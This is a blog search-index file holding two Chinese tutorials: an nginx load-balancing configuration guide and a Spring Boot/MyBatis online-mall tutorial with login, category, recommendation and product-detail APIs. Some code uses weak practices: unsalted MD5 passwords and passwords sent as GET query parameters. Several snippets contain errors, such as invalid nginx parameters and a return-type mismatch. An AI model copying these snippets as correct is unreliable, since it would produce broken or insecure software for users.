[{"title":"nginx","date":"2022-07-24T08:30:05.000Z","path":"2022/07/24/nginx/","text":"Nginx负载均衡配置 将java项目打包并启动这里为了有效果，打包了两份，当访问接口时，控制台打印不同的日志 java -jar .\\api-2.0.1-8081.jar --server.port=8081 java -jar .\\api-2.0.1-8082.jar --server.port=8082 配置nginx#user nobody; worker_processes 4; #pid logs/nginx.pid; events &#123; worker_connections 40960; &#125; http &#123; include mime.types; default_type application/octet-stream; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; upstream myservice &#123; server 127.0.0.1:8081; server 127.0.0.1:8083; # server 127.0.0.1:8847; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://myservice; &#125; &#125; #include vhosts.conf; map $time_iso8601 $logdate &#123; &#x27;~^(?&lt;ymd&gt;\\\\d&#123;4&#125;-\\\\d&#123;2&#125;-\\\\d&#123;2&#125;)&#x27; $ymd; default &#x27;date-not-found&#x27;; &#125; include vhosts/*.conf; client_max_body_size 50m; client_body_buffer_size 60k; client_body_timeout 60; client_header_buffer_size 64k; client_header_timeout 60; error_page 400 /error/400.html; error_page 403 /error/403.html; error_page 404 /error/404.html; error_page 500 /error/500.html; error_page 501 /error/501.html; error_page 502 /error/502.html; error_page 503 /error/503.html; error_page 504 /error/504.html; error_page 505 /error/505.html; error_page 506 /error/506.html; error_page 507 /error/507.html; error_page 509 /error/509.html; error_page 510 /error/510.html; keepalive_requests 100; large_client_header_buffers 4 64k; reset_timedout_connection on; send_timeout 60; sendfile_max_chunk 512k; server_names_hash_bucket_size 256; &#125; worker_rlimit_nofile 100000; 主要配置内容为 upstream myservice &#123; server 127.0.0.1:8081; server 127.0.0.1:8083; # server 127.0.0.1:8847; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://myservice; &#125; &#125; 启动nginx即可 **当启动ngin没反应时，多半是配置文件有问题，可以直接拷贝正确的配置后修改 Nginx负载均衡策略 前端/用户所有对Tomcat(应用服务器)的请求都是通过Nginx转发的:用户请求发送到nginx，nginx转发的对应的服务器，一个集群中有多个服务器节点，那么Nginx怎么确定转发到哪个服务器节点呢?Nginx提供了四种负载均衡策略，同时也支持配置第三方的负载均衡策略。 轮询 根据用户的请求交替的发送到每个服务器节点，是nginx默认的负载均衡策略 upstream myservice &#123; server 127.0.0.1:8081 max_fails=3 fail_timeout 20s fail_time=100s; # 如果在20s内失败了三次 则让该服务器停止100s server 127.0.0.1:8082; server 127.0.0.1:8083; server 127.0.0.1:8084 backup; # 备用机 server 127.0.0.1:8085 down; # 该服务器永远都用不上 &#125; max_fails设置在fail_timeout参数设置的时间内最大失败次数，如果在这个时间内，所有针对该服务器的请求都失败了，那么认为该服务器会被认为是停机了 fail_timeout 与max_fails结合使用 fail_time服务器会被认为停机的时间长度,默认为10s backup标记该服务器为备用服务器,当主服务器停止时，请求会被发送到它这里 down标记服务器永久停机了 权重 upstream myservice &#123; server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125; 权重方式，在轮询策略的基础上指定轮询的几率(根据服务器性能和资源情况设置对应权重比) weight参数用于指定轮询几率,weight的默认值为1，weight的数值与访问比率成正比 权重越高分配到需要处理的请求越多 此策略比较适合服务器的硬件配置差别比较大的情况 ip_hash指定负载均衡器按照基于客户端IP的分配方式，这个方法确保了相同的客户端的请求一直发送到相同的服务器，以保证session会话。这样每个访客都固定访问一个后端服务器，可以解决session不能跨服务器的问题。 upstream myservice &#123; ip_hash; # 保证每个用户固定访问同一个后端服务器 server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125; least _conn把请求转发给连接数较少的后端服务器。轮询算法是把请求平均的转发给各个后端，使它们的负载大致相同;但是，有些请求占用的时间很长，会导致其所在的后端负载较高。这种情况下，least _conn这种方式就可以达到更好的负载均衡效果。 upstream myservice &#123; least _conn; # 把请求转发到连接数较少的fu server 127.0.0.1:8081 weight=2; server 127.0.0.1:8082; server 127.0.0.1:8083; &#125;","tags":[{"name":"nginx","slug":"nginx","permalink":"https://sunzhengyu99.github.io/tags/nginx/"}]},{"title":"","date":"2022-07-10T07:36:41.908Z","path":"2022/07/10/fmmall/","text":"商城项目 项目地址：https://github.com/sunzhengyu99/fmmall/tree/master 体验地址：http://www.fmmall.top/ 1.业务逻辑开发1.1登录注册1.1.1 完成dao操作 创建实体类 package com.sunzy.fmmall.entity; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.sql.Date; @Data @AllArgsConstructor @NoArgsConstructor public class Users &#123; private Integer userId; private String username; private String password; private String nickname; private String realname; private String userImg; private String userMobile; private String userEmail; private String userSex; private Date userBirth; private Date userRegtime; private Date userModtime; &#125; 编写UserDao文件 package com.sunzy.fmmall.dao; import com.sunzy.fmmall.entity.User; import com.sunzy.fmmall.entity.Users; import org.apache.ibatis.annotations.Mapper; @Mapper public interface UserDao &#123; public User queryUserByName(String name); public User insertUser(Users user); &#125; 编写UserMapper.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt; &lt;mapper namespace=&quot;com.sunzy.fmmall.dao.UserDao&quot;&gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.sunzy.fmmall.entity.Users&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;user_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;username&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;password&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;password&quot; /&gt; &lt;result column=&quot;nickname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;nickname&quot; /&gt; &lt;result column=&quot;realname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;realname&quot; /&gt; &lt;result column=&quot;user_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userImg&quot; /&gt; &lt;result column=&quot;user_mobile&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userMobile&quot; /&gt; &lt;result column=&quot;user_email&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userEmail&quot; /&gt; &lt;result column=&quot;user_sex&quot; jdbcType=&quot;CHAR&quot; property=&quot;userSex&quot; /&gt; &lt;result column=&quot;user_birth&quot; jdbcType=&quot;DATE&quot; property=&quot;userBirth&quot; /&gt; &lt;result column=&quot;user_regtime&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;userRegtime&quot; /&gt; &lt;result column=&quot;user_modtime&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;userModtime&quot; /&gt; &lt;/resultMap&gt; &lt;insert id=&quot;insertUser&quot;&gt; insert into users(username, password, user_img, user_regtime, user_modtime) values(#&#123;username&#125;, #&#123;password&#125;,#&#123;userImg&#125;, #&#123;userRegtime&#125;,#&#123;userModtime&#125;) &lt;/insert&gt; &lt;select id=&quot;queryUserByName&quot; resultMap=&quot;BaseResultMap&quot;&gt; select user_id, username, password, nickname, realname, user_img, user_mobile, user_email, user_sex, user_birth, user_regtime, user_modtime from users where username = #&#123;name&#125; &lt;/select&gt; &lt;/mapper&gt; 1.1.2 完成service功能 创建接口com.sunzy.fmmall.service.UserService package com.sunzy.fmmall.service; import com.sunzy.fmmall.vo.ResultVO; public interface UserService &#123; public ResultVO login(String username, String password); public ResultVO regist(String username, String password); &#125; 创建实现类 com.sunzy.fmmall.service.Impl.UserServiceImpl package com.sunzy.fmmall.service.Impl; import com.sunzy.fmmall.dao.UserDao; import com.sunzy.fmmall.entity.Users; import com.sunzy.fmmall.service.UserService; import com.sunzy.fmmall.utils.MD5Utils; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Transactional; import javax.annotation.Resource; import java.util.Date; @Service public class UserServiceImpl implements UserService &#123; @Resource private UserDao userDao; @Override public ResultVO login(String username, String password) &#123; Users user = userDao.queryUserByName(username); if(user == null)&#123; return new ResultVO(ResStatus.NO, &quot;用户不存在！&quot;, null); &#125; String realPasswd = user.getPassword(); if(realPasswd.equals(MD5Utils.md5(password)))&#123; return new ResultVO(ResStatus.OK, &quot;登录成功！&quot;, user); &#125;else &#123; return new ResultVO(ResStatus.NO, &quot;密码错误！&quot;, null); &#125; &#125; @Transactional @Override public ResultVO regist(String username, String password) &#123; synchronized (this)&#123; // 判断用户是否已经注册 Users user = userDao.queryUserByName(username); if(user == null)&#123; // 将新用户信息添加到数据库中 String md5 = MD5Utils.md5(password); user = new Users(); user.setPassword(md5); user.setUsername(username); user.setUserImg(&quot;img/default.png&quot;); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDao.insertUser(user); if(i &gt; 0)&#123; return new ResultVO(ResStatus.OK, &quot;用户注册成功！&quot;, user); &#125;else &#123; return new ResultVO(ResStatus.NO, &quot;用户注册失败！&quot;, null); &#125; &#125;else&#123; return new ResultVO(ResStatus.NO, &quot;用户已被注册！&quot;, null); &#125; &#125; &#125; &#125; 1.1.3 完成controller代码 package com.sunzy.fmmall.controller; import com.sunzy.fmmall.entity.Users; import com.sunzy.fmmall.service.UserService; import com.sunzy.fmmall.vo.ResultVO; import io.swagger.annotations.Api; import io.swagger.annotations.ApiImplicitParam; import io.swagger.annotations.ApiImplicitParams; import io.swagger.annotations.ApiOperation; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; //@RequestBody @RestController @RequestMapping(&quot;/user&quot;) @Api(value = &quot;用户管理&quot;, tags = &quot;提供用户注册和登录接口&quot;) public class UserController &#123; @Autowired private UserService userService; @ApiOperation(&quot;用户登录接口&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户账号&quot;, required = true), @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户密码&quot;, required = true) &#125;) @GetMapping(&quot;/login&quot;) public ResultVO login(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password)&#123; return userService.login(username, password); &#125; @ApiOperation(&quot;用户注册接口&quot;) // @ApiImplicitParams(&#123; // @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户注册账号&quot;, required = true), // @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户注册密码&quot;, required = true) // &#125;) @PostMapping(&quot;/regist&quot;) public ResultVO regist(@RequestBody Users user)&#123; String username = user.getUsername(); String password = user.getPassword(); return userService.regist(username, password); &#125; &#125; 1.1.4 接口测试 1.2 解决前后端跨域问题1.1 前端 通过jsonp跨域 通常为了减轻web服务器的负载，我们把js、css，img等静态资源分离到另一台独立域名的服务器上，在html页面中再通过相应的标签从不同域名下加载静态资源，而被浏览器允许，基于此原理，我们可以通过动态创建script，再请求一个带参网址实现跨域通信。 &lt;script&gt; var script = document.createElement(&#x27;script&#x27;); script.type = &#x27;text/javascript&#x27;; // 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数 script.src = &#x27;http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback&#x27;; document.head.appendChild(script); // 回调执行函数 function handleCallback(res) &#123; alert(JSON.stringify(res)); &#125; &lt;/script&gt; 1.2 后端 只需要在controller中添加@CrossOrigin注解即可允许后端响应数据进行跨域响应。 1.3 将用户信息显示在前端在前端登录（login.html的doSubmit方法中）的ajax请求的响应代码中加入以下内容 if(vo.code == 10000)&#123; //如果登录成功，就把token存储到cookie setCookieValue(&quot;token&quot;,vo.msg); //将用户昵称和用户头像的路径保存在cookie setCookieValue(&quot;userId&quot;,vo.data.userId); setCookieValue(&quot;username&quot;,vo.data.username); setCookieValue(&quot;userImg&quot;,vo.data.userImg) &#125; 即登录成功后，将用户的token和用户信息一同保存到cookie中，用于前端传值 在index.html的created函数中添加以下代码 var token = getCookieValue(&quot;token&quot;); if(token !=null &amp;&amp; token !=&quot;&quot;)&#123; this.isLogin = true; this.username = getCookieValue(&quot;username&quot;); this.userimg = getCookieValue(&quot;userImg&quot;); &#125; 获取到用户的基本信息，再通过v-model显示到前端页面中。 1.4 首页轮播图 数据库操作实现 编写sql语句 SELECT * FROM index_img WHERE &#96;status&#96; &#x3D; 1 ORDER BY seq 在IndexImgMapper定义方法 public interface IndexImgMapper extends GeneralDao&lt;IndexImg&gt; &#123; public List&lt;IndexImg&gt; listIndexImgs(); &#125; 配置映射文件 &lt;select id=&quot;listIndexImgs&quot; resultType=&quot;com.sunzy.fmmall.entity.IndexImg&quot; resultMap=&quot;BaseResultMap&quot;&gt; SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq &lt;/select&gt; 业务逻辑实现 IndexImgServiceImpl添加以下内容 @Service public class IndexImgServiceImpl implements IndexImgService &#123; @Resource private IndexImgMapper indexImgMapper; @Override public ResultVO listIndeximgs() &#123; List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs(); if(indexImgs.size() == 0)&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125; return new ResultVO(ResStatus.OK, &quot;success&quot;,indexImgs); &#125; &#125; 接口实现 IndexImgController @RestController @RequestMapping(&quot;/index&quot;) @CrossOrigin public class IndexImgsController &#123; @Autowired private IndexImgService indexImgService; @GetMapping(&quot;/indeximg&quot;) public ResultVO addGoods()&#123; return ResultVO.success(indexImgService.listIndeximgs()); &#125; &#125; 1.5 分类列表接口开发 数据库分析 添加实体类CategoryVO 与category的区别在于多了一个属性用于存放子标题 List&lt;CategoryVO&gt; categoryVOList; dao实现 方法一 使用递归sql查询数据库 dao代码 public List&lt;CategoryVO&gt; getCategoryList2(int parentId); mapper映射文件 &lt;resultMap id=&quot;ResultMap&quot; type=&quot;com.sunzy.fmmall.entity.CategoryVO&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;category_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryName&quot; /&gt; &lt;result column=&quot;category_level&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryLevel&quot; /&gt; &lt;result column=&quot;parent_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;parentId&quot; /&gt; &lt;result column=&quot;category_icon&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryIcon&quot; /&gt; &lt;result column=&quot;category_slogan&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categorySlogan&quot; /&gt; &lt;result column=&quot;category_pic&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryPic&quot; /&gt; &lt;result column=&quot;category_bg_color&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryBgColor&quot; /&gt; &lt;collection property=&quot;categoryVOList&quot; column=&quot;category_id&quot; select=&quot;com.sunzy.fmmall.dao.CategoryMapper.getCategoryList2&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getCategoryList2&quot; resultType=&quot;com.sunzy.fmmall.entity.CategoryVO&quot; resultMap=&quot;ResultMap&quot;&gt; select * from category where parent_id = #&#123;parentId&#125; &lt;/select&gt; 方法二 直接获取所有分类的数据后，在java代码中进行级别分类的处理，可以大大提高处理效率 service代码实现 方法一 @Override public List&lt;CategoryVO&gt; getCategoryList() &#123; return categoryMapper.getCategoryList2(0); &#125; 方法二 @Override public List&lt;CategoryVO&gt; getCategoryList() &#123; List&lt;Category&gt; categories = categoryMapper.getCategoryList(); List&lt;CategoryVO&gt; categoryVOS = new ArrayList&lt;&gt;(); // 获取所有的一级标题 for (Category category : categories) &#123; CategoryVO categoryVO = new CategoryVO(); if(category.getCategoryLevel() == 1)&#123; BeanUtils.copyProperties(category, categoryVO); categoryVOS.add(categoryVO); &#125; &#125; // 将一级标题下的二级标题添加到setCategoryVOList属性中 for (CategoryVO categoryVO : categoryVOS) &#123; List&lt;CategoryVO&gt; category2List = new ArrayList&lt;&gt;(); for (Category category : categories) &#123; // 筛选条件为 二级标题且父标题与一级标题一致 if(category.getCategoryLevel() == 2 &amp;&amp; category.getParentId().equals(categoryVO.getCategoryId()))&#123; CategoryVO categoryvo = new CategoryVO(); BeanUtils.copyProperties(category, categoryvo); category2List.add(categoryvo); &#125; &#125; categoryVO.setCategoryVOList(category2List); // System.out.println(categoryVO); &#125; for (CategoryVO categoryVO : categoryVOS) &#123; for(CategoryVO categoryVO2: categoryVO.getCategoryVOList())&#123; //遍历所有二级标题 List&lt;CategoryVO&gt; category3List = new ArrayList&lt;&gt;(); //保存三级标题的数组 for (Category category : categories) &#123; // 筛选符合条件的三级标题 存放到二级标题的 categoryVOList中 if(category.getCategoryLevel() == 3 &amp;&amp; category.getParentId().equals(categoryVO2.getCategoryId()))&#123; CategoryVO categoryvo = new CategoryVO(); BeanUtils.copyProperties(category, categoryvo); category3List.add(categoryvo); &#125; &#125; categoryVO2.setCategoryVOList(category3List); &#125; System.out.println(categoryVO); &#125; return categoryVOS; &#125; controller实现 @Autowired private CategoryService categoryService; @GetMapping(&quot;/category-list&quot;) @ApiOperation(value = &quot;获取首页分类数据&quot;) public ResultVO getCategoryList()&#123; return ResultVO.success(categoryService.getCategoryList1()); // return ResultVO.success(categoryService.getCategoryList2()); &#125; 实测方法二比方法一的响应速度要快很多倍，所以还是减少在数据库中进行数据的处理。 方法一 方法二 实现效果如下 1.6 商品推荐 推荐商品原则可以是 1.根据商城销量推荐2.推荐商城最新上架的商品 说明：商品推荐算法是根据多个维度进行权重计算的结果，计算出一个匹配值 数据库操作 select * from product order by create_time desc limit 0,3; 添加实体类ProdoctVO 与product的区别在于多一个属性用于存在与该产品相关的图片 private List&lt;ProductImg&gt; imgs; public List&lt;ProductImg&gt; getImgs() &#123; return imgs; &#125; public void setImgs(List&lt;ProductImg&gt; imgs) &#123; this.imgs = imgs; &#125; dao实现 ProductDao @Mapper public interface ProductMapper extends GeneralDao&lt;Product&gt; &#123; public List&lt;Product&gt; getRecommendProduct(); &#125; xml &lt;id column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;root_category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;rootCategoryId&quot; /&gt; &lt;result column=&quot;sold_num&quot; jdbcType=&quot;INTEGER&quot; property=&quot;soldNum&quot; /&gt; &lt;result column=&quot;product_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;productStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;content&quot; jdbcType=&quot;LONGVARCHAR&quot; property=&quot;content&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;getRecommendProduct&quot; resultType=&quot;com.sunzy.fmmall.entity.Product&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product order by create_time desc limit 0,3; &lt;/select&gt; ProductImgDao @Mapper public interface ProductImgMapper extends GeneralDao&lt;ProductImg&gt; &#123; public List&lt;ProductImg&gt; getProductImgsById(int productId); &#125; xml &lt;id column=&quot;id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;id&quot; /&gt; &lt;result column=&quot;item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;itemId&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;url&quot; /&gt; &lt;result column=&quot;sort&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sort&quot; /&gt; &lt;result column=&quot;is_main&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isMain&quot; /&gt; &lt;result column=&quot;created_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createdTime&quot; /&gt; &lt;result column=&quot;updated_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updatedTime&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;getProductImgsById&quot; resultType=&quot;com.sunzy.fmmall.entity.ProductImg&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product_img where item_id = #&#123;productId&#125; &lt;/select&gt; service代码 @Resource private ProductMapper productMapper; @Resource private ProductImgMapper productImgMapper; @Override public List&lt;ProductVO&gt; getRecommendProductList() &#123; List&lt;Product&gt; recommendProductList = productMapper.getRecommendProduct(); List&lt;ProductVO&gt; productVOS = new ArrayList&lt;&gt;(); for (Product product : recommendProductList) &#123; ProductVO productVO = new ProductVO(); List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId())); BeanUtils.copyProperties(product, productVO); productVO.setImgs(imgs); productVOS.add(productVO); &#125; return productVOS; &#125; controller代码 @Autowired private ProductService productService; @GetMapping(&quot;/list-recommends&quot;) @ApiOperation(value = &quot;获取商品推荐数据&quot;) public ResultVO getRecommendsList()&#123; return ResultVO.success(productService.getRecommendProductList()); &#125; 测试结果 1.7 分类商品推荐 一次性加载所有分类的推荐商品，整体完成初始化 分别获取所有一级标题下销量最高的六个商品 返回查询到的6个商品 sql语句 from product where root_category_id &#x3D; rootId and product_status &#x3D; 1 order by sold_num desc limit 0,6; 获取到rootId下销量前六的商品信息 dao public List&lt;Product&gt; getRecommendByCategory(int rootId); xml &lt;select id=&quot;getRecommendByCategory&quot; resultType=&quot;com.sunzy.fmmall.entity.Product&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product where root_category_id = #&#123;rootId&#125; and product_status = 1 order by sold_num desc limit 0,6; &lt;/select&gt; service @Override public List&lt;CategoryDTO&gt; getRecommendByCategory() &#123; List&lt;Category&gt; categoryList = categoryMapper.getCategoryList(); // 获取所有的分类 List&lt;CategoryDTO&gt; categoryDTOList = new ArrayList&lt;&gt;(); // 用于保存结果 for (Category category : categoryList) &#123; if (category.getCategoryLevel() == 1) &#123; CategoryDTO categoryDTO = new CategoryDTO(); List&lt;ProductVO&gt; productVOList = new ArrayList&lt;&gt;(); List&lt;Product&gt; productList = productMapper.getRecommendByCategory(category.getCategoryId()); // 根据root_category_id筛选属于该一级分类的商品 for (Product product : productList) &#123; // 将产品的图片查询出来加入到productVO的imgs属性中 ProductVO productVO = new ProductVO(); List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId())); BeanUtils.copyProperties(product, productVO); productVO.setImgs(imgs); productVOList.add(productVO); &#125; // 将处理得到的productVOList加入到CategoryDTO的products属性中 categoryDTO.setProducts(productVOList); BeanUtils.copyProperties(category, categoryDTO); categoryDTOList.add(categoryDTO); &#125; &#125; return categoryDTOList; &#125; ** 该方法实现的有点复杂，并且效率比较低，可以采用联合查询的方法进行优化 controller @GetMapping(&quot;/category-recommends&quot;) @ApiOperation(value = &quot;根据商品分类销量前六推荐商品&quot;) public ResultVO getRecommendByCategoryList()&#123; return ResultVO.success(productService.getRecommendByCategory()); &#125; 接口测试 前端实现效果 1.8 商品详情 点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面 用户点击时，携带商品的id进行后端请求，后端接收到商品id后，进行数据库查询，返回详细信息 包括以下内容 1.商品的基本信息 2.商品的套餐信息 3.商品的图片信息 4.商品的评价信息 5.商品的参数信息 商品详情接口 接口所需信息如下，只需要三个单表查询即可完成，因此dao层可以直接使用tkMapper提供的接口 service public ResultVO getProductBasicInfo(String productId) &#123; //1.商品基本信息 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); criteria.andEqualTo(&quot;productStatus&quot;,1);//状态为1表示上架商品 List&lt;Product&gt; products = productMapper.selectByExample(example); if(products.size() &gt; 0)&#123; Example exampleImg = new Example(ProductImg.class); Example.Criteria imgCriteria = exampleImg.createCriteria(); imgCriteria.andEqualTo(&quot;itemId&quot;,productId); List&lt;ProductImg&gt; productImgs = productImgMapper.selectByExample(exampleImg); Example exampleSku = new Example(ProductSku.class); Example.Criteria skuCriteria = exampleSku.createCriteria(); skuCriteria.andEqualTo(&quot;productId&quot;,productId); List&lt;ProductSku&gt; productSkus = productSkuMapper.selectByExample(exampleSku); HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;product&quot;, products.get(0)); hashMap.put(&quot;productImgs&quot;, productImgs); hashMap.put(&quot;productSkus&quot;, productSkus); return ResultVO.success(hashMap); &#125; return ResultVO.failed(&quot;查询的商品不存在&quot;); &#125; controller @RestController @CrossOrigin @RequestMapping(&quot;/product&quot;) @Api(value = &quot;提供商品信息相关的接口&quot;,tags = &quot;商品管理&quot;) public class ProductController &#123; @Autowired private ProductService productService; @Autowired private ProductCommontsService productCommontsService; @ApiOperation(&quot;商品基本信息查询接口&quot;) @GetMapping(&quot;/detail-info/&#123;pid&#125;&quot;) public ResultVO getProductBasicInfo(@PathVariable(&quot;pid&quot;) String pid)&#123; return productService.getProductBasicInfo(pid); &#125; &#125; 接口测试 商品参数接口 接口所需数据可知，也为单表查询，因此dao层可以直接使用tkMapper提供的接口 service @Override public ResultVO getProductParamsById(String productId) &#123; //1.商品基本信息 Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); criteria.andEqualTo(&quot;productStatus&quot;,1);//状态为1表示上架商品 List&lt;Product&gt; products = productMapper.selectByExample(example); if(products.size() &gt; 0)&#123; Example exampleParams = new Example(ProductParams.class); Example.Criteria criteria1 = exampleParams.createCriteria(); criteria1.andEqualTo(&quot;productId&quot;, productId); List&lt;ProductParams&gt; params = productParamsMapper.selectByExample(exampleParams); if(params.size() &gt; 0)&#123; return ResultVO.success(params.get(0)); &#125;else &#123; return ResultVO.failed(&quot;此产品为三无产品！&quot;); &#125; &#125;else &#123; return ResultVO.failed(&quot;查询的商品不存在&quot;); &#125; &#125; controller @ApiOperation(&quot;商品参数信息查询接口&quot;) @GetMapping(&quot;/detail-params/&#123;pid&#125;&quot;) public ResultVO getProductParams(@PathVariable(&quot;pid&quot;) String pid)&#123; return productService.getProductParamsById(pid); &#125; 测试结果 商品评价接口评价接口需要完成两个功能：评价列表分页展示和评价分析 评价列表分页展示 ​ 接口所需参数如上图，可以看出需要关联用户数据，因此为多表关联查询 sql select u.username, u.nickname, u.user_img, c.comm_id, c.product_id, c.product_name, c.order_item_id, c.user_id, c.is_anonymous, c.comm_type, c.comm_level, c.comm_content, c.comm_imgs, c.sepc_name, c.reply_status, c.reply_content, c.reply_time, c.is_show from product_comments c INNER JOIN users u ON u.user_id &#x3D; c.user_id WHERE c.product_id &#x3D; 3 limit 1,5 dao &lt;resultMap id=&quot;ProductCommentsVOMap&quot; type=&quot;com.qfedu.fmmall.entity.ProductCommentsVO&quot;&gt; &lt;id column=&quot;comm_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;order_item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderItemId&quot; /&gt; &lt;result column=&quot;is_anonymous&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isAnonymous&quot; /&gt; &lt;result column=&quot;comm_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;commType&quot; /&gt; &lt;result column=&quot;comm_level&quot; jdbcType=&quot;INTEGER&quot; property=&quot;commLevel&quot; /&gt; &lt;result column=&quot;comm_content&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commContent&quot; /&gt; &lt;result column=&quot;comm_imgs&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commImgs&quot; /&gt; &lt;result column=&quot;sepc_name&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;sepcName&quot; /&gt; &lt;result column=&quot;reply_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;replyStatus&quot; /&gt; &lt;result column=&quot;reply_content&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;replyContent&quot; /&gt; &lt;result column=&quot;reply_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;replyTime&quot; /&gt; &lt;result column=&quot;is_show&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isShow&quot; /&gt; &lt;result column=&quot;user_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userId&quot; /&gt; &lt;result column=&quot;username&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;username&quot; /&gt; &lt;result column=&quot;nickname&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;nickname&quot; /&gt; &lt;result column=&quot;user_img&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;userImg&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;selectCommontsByProductId&quot; resultMap=&quot;ProductCommentsVOMap&quot;&gt; select u.username, u.nickname, u.user_img, c.comm_id, c.product_id, c.product_name, c.order_item_id, c.user_id, c.is_anonymous, c.comm_type, c.comm_level, c.comm_content, c.comm_imgs, c.sepc_name, c.reply_status, c.reply_content, c.reply_time, 